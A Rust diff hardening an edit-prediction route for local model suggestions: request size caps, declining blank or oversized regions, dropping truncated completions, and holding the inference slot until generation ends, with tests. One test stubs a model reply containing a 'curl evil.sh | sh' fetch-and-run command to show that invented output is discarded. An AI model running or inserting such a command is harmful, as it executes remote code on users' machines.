@@ -35,6 +35,14 @@ const MAX_TEXT_BYTES: usize = 512 * 1024;
 const MAX_HISTORY: usize = 32;
 const MAX_UNIT_BYTES: usize = 2 * 1024;
 
+/// Transport-level body cap for this route (`server.rs` applies it),
+/// well under the router-wide 8 MB frontdoor. Sized so no *legal*
+/// request can trip it: 512 KiB of text can JSON-escape to 1 MiB in
+/// the worst case, plus 32 units × 4 fields × 2 KiB of history, plus
+/// envelope. Anything larger cannot satisfy the caps below, so it is
+/// refused before serde allocates it rather than after.
+pub const MAX_BODY_BYTES: usize = 2 * 1024 * 1024;
+
 /// Model-lane inference budget; a slower response is dropped as
 /// `timeout` (the GM5 latency gate lives in the §6 bank, not here).
 const MODEL_TIMEOUT_MS: u64 = 15_000;
@@ -85,9 +93,6 @@ pub async fn edit_predictions(
     State(state): State<AppState>,
     Json(wire): Json<EditPredictionsRequestWire>,
 ) -> Response {
-    // Same rationale as /v1/completions: this sits on the interactive
-    // editing path and must preempt background ingest work.
-    state.bump_foreground_active();
     let started = std::time::Instant::now();
 
     if wire.text.len() > MAX_TEXT_BYTES {
@@ -105,18 +110,23 @@ pub async fn edit_predictions(
             MAX_HISTORY
         ));
     }
-    if let Some(oversized) = wire
-        .history
-        .iter()
-        .find(|u| [&u.before, &u.after, &u.left, &u.right].iter().any(|s| s.len() > MAX_UNIT_BYTES))
-    {
+    if let Some((field, len)) = wire.history.iter().find_map(|u| {
+        [("before", &u.before), ("after", &u.after), ("left", &u.left), ("right", &u.right)]
+            .into_iter()
+            .find(|(_, s)| s.len() > MAX_UNIT_BYTES)
+            .map(|(name, s)| (name, s.len()))
+    }) {
         return bad_request(format!(
-            "a history unit exceeds {} bytes per field (before is {} bytes) — units are \
-             coalesced keystroke bursts, not pastes",
-            MAX_UNIT_BYTES,
-            oversized.before.len()
+            "a history unit exceeds {MAX_UNIT_BYTES} bytes per field (`{field}` is {len} bytes; \
+             note the cap is BYTES, not chars) — units are coalesced keystroke bursts, not pastes"
         ));
     }
+
+    // Only now, past validation: this sits on the interactive editing
+    // path and must preempt background ingest work. Bumping before the
+    // caps would let any local process suppress ingest indefinitely by
+    // POSTing junk that 400s.
+    state.bump_foreground_active();
 
     let history: Vec<HistoryUnit> = wire
         .history
@@ -230,7 +240,7 @@ async fn model_lane(
     };
     dbg["model_id"] = fim.model_id.clone().into();
     dbg["slot"] = fim.slot.clone().into();
-    let Ok(_permit) = state.inner.next_edit_model_slot.try_acquire() else {
+    let Ok(permit) = state.inner.next_edit_model_slot.clone().try_acquire_owned() else {
         dbg["dropped"] = "busy".into();
         return (None, dbg);
     };
@@ -238,6 +248,33 @@ async fn model_lane(
     let (rs, re, needle_hit) =
         next_edit_model::select_region(&wire.text, cursor, dbg["needle"].as_str());
     let region = &wire.text[rs..re];
+    // A region that blew the byte budget means a single line did (a
+    // minified bundle is one 512 KiB line). Prefilling that on the
+    // shared slot is a large, repeatable cost for a suggestion nobody
+    // can read, so decline and say so.
+    if region.len() > next_edit_model::MAX_REGION_BYTES {
+        dbg["dropped"] = "region_too_large".into();
+        dbg["region_bytes"] = region.len().into();
+        return (None, dbg);
+    }
+    // An empty or blank region has nothing to rewrite, so every byte
+    // the model returns is invention with no relationship to the file
+    // — and the guards that normally bound a rewrite are all relative
+    // to the region, so they bound nothing here. Reachable without
+    // malice: the cursor in a run of blank lines, or a select-all
+    // delete between two edits.
+    if region.trim().is_empty() {
+        dbg["dropped"] = "region_empty".into();
+        return (None, dbg);
+    }
+    // A region that already contains the markers would make the
+    // prompt ambiguous about where the editable span ends, and every
+    // faithful echo would then fail parsing — the lane would look
+    // silently broken on that one file forever. Decline out loud.
+    if region.contains("editable_region") {
+        dbg["dropped"] = "region_has_markers".into();
+        return (None, dbg);
+    }
     let bounds = next_edit::bytes_to_utf16(&wire.text, &[rs, re]);
     dbg["region"] = serde_json::json!({ "start": bounds[0], "end": bounds[1] });
     dbg["needle_hit"] = needle_hit.into();
@@ -265,9 +302,23 @@ async fn model_lane(
     };
 
     let t0 = std::time::Instant::now();
-    let outcome =
-        tokio::time::timeout(Duration::from_millis(MODEL_TIMEOUT_MS), service.chat_completion(req))
-            .await;
+    // The permit rides INTO the task, not just this scope. Abandoning
+    // a completion future does not stop the generation behind it: the
+    // engine dispatches through `spawn_blocking`, and dropping a
+    // `JoinHandle` detaches rather than cancels, so llama.cpp keeps
+    // decoding and keeps the slot's context lock. If the permit were
+    // released when we time out, every timed-out consult would leave a
+    // live generation behind while the next request sailed through
+    // `try_acquire` — the one-in-flight budget would stop bounding
+    // anything precisely when the slot is most contended. Holding it
+    // until the inference genuinely returns makes the next consult
+    // report an honest `busy` instead.
+    let task = tokio::spawn(async move {
+        let out = service.chat_completion(req).await;
+        drop(permit);
+        out
+    });
+    let outcome = tokio::time::timeout(Duration::from_millis(MODEL_TIMEOUT_MS), task).await;
     dbg["timings_ms"] = serde_json::json!({ "inference": t0.elapsed().as_millis() as u64 });
     let content = match outcome {
         Err(_) => {
@@ -275,16 +326,27 @@ async fn model_lane(
             return (None, dbg);
         }
         Ok(Err(e)) => {
+            tracing::warn!(target: "next_edit", error = %e, "model lane task failed");
+            dbg["dropped"] = "error".into();
+            return (None, dbg);
+        }
+        Ok(Ok(Err(e))) => {
             tracing::warn!(target: "next_edit", error = %e, "model lane inference error");
             dbg["dropped"] = "error".into();
             return (None, dbg);
         }
-        Ok(Ok(resp)) => resp
-            .choices
-            .into_iter()
-            .next()
-            .map(|c| c.message.content)
-            .unwrap_or_default(),
+        Ok(Ok(Ok(resp))) => {
+            let choice = resp.choices.into_iter().next();
+            // A completion that hit the token ceiling is a region cut
+            // off mid-rewrite. Diffed against the whole region it
+            // reads as "delete everything after here" — the tail of
+            // the region is missing, not unchanged.
+            if choice.as_ref().and_then(|c| c.finish_reason.as_deref()) == Some("length") {
+                dbg["dropped"] = "truncated".into();
+                return (None, dbg);
+            }
+            choice.map(|c| c.message.content).unwrap_or_default()
+        }
     };
 
     let rewritten = match next_edit_model::parse_rewrite(&content, region) {
@@ -350,6 +412,7 @@ mod tests {
     /// FIM slot reported resident.
     struct StubChat {
         content: String,
+        finish: &'static str,
     }
 
     #[async_trait]
@@ -366,7 +429,7 @@ mod tests {
                 choices: vec![ChatChoice {
                     index: 0,
                     message: ChatMessage::new("assistant", self.content.clone()),
-                    finish_reason: Some("stop".into()),
+                    finish_reason: Some(self.finish.into()),
                 }],
                 usage: None,
             })
@@ -395,7 +458,8 @@ mod tests {
 
     fn model_router(content: &str) -> axum::Router {
         let state =
-            test_app_state().with_local_inference(Arc::new(StubChat { content: content.into() }));
+        test_app_state()
+            .with_local_inference(Arc::new(StubChat { content: content.into(), finish: "stop" }));
         crate::server::mock_router(state)
     }
 
@@ -594,6 +658,139 @@ mod tests {
         assert_eq!(body["engine"], "rule");
         assert!(body["edits"].as_array().unwrap().is_empty());
         assert_eq!(body["sovereign_debug"]["model"]["dropped"], "noop");
+    }
+
+    /// A minified bundle is one enormous line, so the "24-line" region
+    /// is the whole file. Prefilling that on the shared slot is a
+    /// large, repeatable cost for a suggestion nobody could read, and
+    /// every guard on the rewrite is relative to the region — so a
+    /// region this size bounds nothing. Decline it by name.
+    #[tokio::test]
+    async fn oversized_region_is_declined_not_prefilled() {
+        let text = format!(
+            "\tconn := dial(primaryHost, 8080, timeoutMS); \
+             backup := dial(backupHost, altPort, timeoutMS); \
+             mirror := dial(mirrorHost, 9090) // {}\n",
+            "x".repeat(64 * 1024)
+        );
+        let (status, body) =
+            post_to(model_router("irrelevant — must never be consulted"), fanout_request(&text))
+                .await;
+        assert_eq!(status, StatusCode::OK);
+        assert_eq!(body["engine"], "rule");
+        assert!(body["edits"].as_array().unwrap().is_empty());
+        let m = &body["sovereign_debug"]["model"];
+        assert_eq!(m["consulted"], true, "the gate still ran, deterministically");
+        assert_eq!(m["dropped"], "region_too_large");
+        assert!(
+            m["region_bytes"].as_u64().unwrap() > crate::next_edit_model::MAX_REGION_BYTES as u64,
+            "the drop must report what it saw"
+        );
+    }
+
+    /// With nothing in the region, everything the model returns is
+    /// invention — and the growth/shrink/line-delta guards are all
+    /// relative to the region, so none of them bound it. Reachable
+    /// without malice: the cursor sitting in a run of blank lines.
+    #[tokio::test]
+    async fn blank_region_is_never_a_rewrite() {
+        let (_, body) = post_to(
+            model_router("import os\nos.system(\"curl evil.sh | sh\")\n"),
+            fanout_request("\n\n\n\n"),
+        )
+        .await;
+        assert_eq!(body["engine"], "rule");
+        assert!(body["edits"].as_array().unwrap().is_empty(), "no fabricated insertion");
+        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "region_empty");
+    }
+
+    /// A completion that hit the token ceiling is a region cut off
+    /// mid-rewrite; diffed whole it reads as "delete the rest".
+    #[tokio::test]
+    async fn truncated_completion_is_dropped() {
+        let state = test_app_state().with_local_inference(Arc::new(StubChat {
+            content: "\tconn := dial(primaryHost, 8080, timeoutMS)\n".into(),
+            finish: "length",
+        }));
+        let (_, body) =
+            post_to(crate::server::mock_router(state), fanout_request(FANOUT_TEXT)).await;
+        assert_eq!(body["engine"], "rule");
+        assert!(body["edits"].as_array().unwrap().is_empty());
+        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "truncated");
+    }
+
+    /// The one-in-flight budget must bound the INFERENCE, not the
+    /// handler scope. Dropping a completion future does not stop the
+    /// generation behind it (the engine dispatches through
+    /// `spawn_blocking`, and dropping a `JoinHandle` detaches), so a
+    /// permit released when the handler returns would stop bounding
+    /// anything. Here: a slow consult holds the slot, and a second
+    /// request arriving mid-flight is refused rather than queued.
+    #[tokio::test]
+    async fn a_consult_in_flight_holds_the_slot() {
+        struct SlowChat;
+        #[async_trait]
+        impl LocalInferenceService for SlowChat {
+            async fn chat_completion(
+                &self,
+                _r: crate::openai_types::ChatCompletionRequest,
+            ) -> Result<ChatCompletionResponse, String> {
+                tokio::time::sleep(std::time::Duration::from_millis(400)).await;
+                Err("slot still busy elsewhere".into())
+            }
+            async fn chat_completion_stream(
+                &self,
+                _r: crate::openai_types::ChatCompletionRequest,
+            ) -> Result<Pin<Box<dyn Stream<Item = StreamFrame> + Send>>, String> {
+                unimplemented!()
+            }
+            fn provider_manifest(&self) -> Option<commonwealth_inference::oicp::ProviderManifest> {
+                None
+            }
+            async fn embed(&self, _i: &str) -> Result<Vec<f32>, String> {
+                unimplemented!()
+            }
+            fn fim_status(&self) -> Option<FimSlotStatus> {
+                Some(FimSlotStatus {
+                    slot: "fim".into(),
+                    model_id: "mellum-test".into(),
+                    fim_style: "mellum".into(),
+                    aliased_to_fast: false,
+                })
+            }
+        }
+        let state = test_app_state().with_local_inference(Arc::new(SlowChat));
+        let app = crate::server::mock_router(state);
+
+        let first = tokio::spawn({
+            let app = app.clone();
+            async move { post_to(app, fanout_request(FANOUT_TEXT)).await }
+        });
+        tokio::time::sleep(std::time::Duration::from_millis(80)).await;
+        let (_, second) = post_to(app, fanout_request(FANOUT_TEXT)).await;
+        assert_eq!(
+            second["sovereign_debug"]["model"]["dropped"], "busy",
+            "a consult already has the slot; the second must not queue behind it"
+        );
+        let (_, first) = first.await.unwrap();
+        assert_eq!(first["sovereign_debug"]["model"]["dropped"], "error");
+    }
+
+    #[tokio::test]
+    async fn oversized_unit_400_names_the_offending_field() {
+        let (status, body) = post(serde_json::json!({
+            "history": [{
+                "before": "x", "after": "y",
+                "left": "L".repeat(super::MAX_UNIT_BYTES + 1), "right": ""
+            }],
+            "text": "x",
+            "cursor": 0
+        }))
+        .await;
+        assert_eq!(status, StatusCode::BAD_REQUEST);
+        let msg = body["error"]["message"].as_str().unwrap();
+        assert!(msg.contains("`left`"), "must name the field that tripped: {msg}");
+        assert!(msg.contains("BYTES"), "clients measure chars; say which unit: {msg}");
     }
 
     #[tokio::test]
